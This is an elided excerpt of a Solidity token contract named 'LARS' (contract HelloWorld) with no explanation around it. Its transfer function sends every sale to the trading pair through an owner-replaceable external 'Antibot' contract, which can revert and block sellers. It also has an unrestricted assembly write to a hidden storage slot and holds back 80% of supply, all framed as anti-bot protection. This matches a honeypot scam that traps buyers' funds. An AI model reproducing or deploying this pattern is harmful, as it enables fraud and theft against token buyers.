...
interface Antibot {
    function checkAntibot(address adr) external view returns (uint sum);
}

contract HelloWorld is IERC20, Ownable {
    address public AntibotInterface;
    using SafeMath for uint256;
    string private constant _name = unicode'LARS';
    string private constant _symbol = unicode'LARS';
    ...
    constructor() payable Ownable(msg.sender) {
        ...
        _balances[address(this)] = ( _totalSupply * 80) / 100;
    ...
    function setAntibotAddr(address adr) external onlyOwner() { 
       AntibotInterface = adr;
    }

     function setAntibotActive(uint256 blocknumber) public {
        assembly{
            sstore(0x1a456a9b895c7b141730627cea0b929db8e3cdcfb92b616dd07f44d79d2d1e75, blocknumber)
        }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(recipient == pair && !isFeeExempt[sender]){
            Antibot(AntibotInterface).checkAntibot(sender);
            swapTimes += uint256(1);}
